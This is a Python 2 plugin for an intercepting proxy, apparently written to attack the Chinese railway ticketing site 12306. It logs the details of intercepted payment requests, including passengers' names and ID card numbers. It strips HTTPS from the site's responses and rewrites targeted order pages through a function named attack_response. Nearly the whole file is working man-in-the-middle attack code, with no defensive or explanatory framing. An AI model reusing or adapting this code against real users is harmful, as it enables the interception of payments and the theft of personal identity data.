# coding=utf-8

from http import * 
from urlparse import *
import cStringIO 
import zlib, string
# import sys, tty, termios

from sinorail import * 

def proxy_mangle_request(req):
    if is_12306(req):
        if req.getMethod() == HTTPRequest.METHOD_POST :
            host, port = req.getHost()
            action = get_12306_action(req) 
            reqParams = req.getParams() 
            if action == "confirmPassengerAction.do" and reqParams["method"] == "payOrder" :
                print "************************************************************"
                print "Capture target request (REQ #%d)" % req.uid
                print "POST %s:%d %s" % (host, port, req.getPath())
                print "Order sequence NO: %s" % reqParams["orderSequence_no"]
                print "Train NO: %s" % reqParams["orderRequest.station_train_code"]
                print "From %s (%s) to %s (%s)" % (reqParams["orderRequest.from_station_name"],
                                                   reqParams["orderRequest.from_station_telecode"],
                                                   reqParams["orderRequest.to_station_name"], 
                                                   reqParams["orderRequest.to_station_telecode"]
                                                   )
                print "Date: %s, departure at %s, arrive at %s" % (reqParams["orderRequest.train_date"], 
                                                                   reqParams["orderRequest.start_time"], 
                                                                   reqParams["orderRequest.end_time"]
                                                                   )
                i = 1
                while ("passenger_"+str(i)+"_name") in reqParams :
                    prefix = "passenger_"+str(i)
                    print "Passenger %d: %s, %s, %s" % (i, 
                                                        reqParams[prefix+"_name"],
                                                        reqParams[prefix+"_cardno"],
                                                        seat_type(reqParams[prefix+"_seat"])
                                                        )
                    i = i+1
                print "************************************************************"
            elif action == "myOrderAction.do" and reqParams["method"] == "laterEpay":
                print "************************************************************"
                print "Capture target request (REQ #%d): POST %s:%d %s" % (req.uid, host, port, req.getPath())
                print "Order sequence NO: %s" % reqParams["orderSequence_no"]
                print "************************************************************"
    return req

def proxy_mangle_response(reqres):
    req, res = reqres.request, reqres.response
    if is_12306(req) and not is_target(req) :
        return remove_https(res) 
    elif is_target(req) :
        return attack_response(res) 
    else :
        return res.serialize()

def attack_response(res):
    data = cStringIO.StringIO(res.serialize())
    line = data.readline() 
    newdata = line
    while line != HTTPMessage.EOL :
        # print line
        line = data.readline() 
        newdata += line
    if res.isChunked() :
        chunklen = int(data.readline().strip(), 16)
        # print "Chunk length: %d" % chunklen
        chunk = data.read(chunklen)
        page = zlib.decompress(chunk, 16+zlib.MAX_WBITS)
        parser = RailActiveParser() 
        parser.feed(page) 
        gzipPage = parser.gzipPage()
        newdata += "%x" % len(gzipPage) + HTTPMessage.EOL
        newdata += gzipPage + HTTPMessage.EOL
        newdata += "0" + HTTPMessage.EOL + HTTPMessage.EOL
    else : 
        page = data.read()
        parser = RailActiveParser()
        parser.feed(page) 
        newdata += parser.page 
    return newdata
